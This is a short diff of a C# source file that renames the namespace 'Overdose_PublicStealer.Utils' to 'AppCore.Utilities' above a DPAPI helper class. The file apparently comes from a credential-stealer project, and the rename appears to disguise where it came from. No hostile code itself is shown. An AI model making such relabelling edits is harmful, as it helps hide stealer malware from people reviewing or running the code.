@@ -1,7 +1,7 @@
-﻿using System;
+using System;
 using System.Runtime.InteropServices;
 
-namespace Overdose_PublicStealer.Utils
+namespace AppCore.Utilities
 {
     internal static class DPAPI
     {
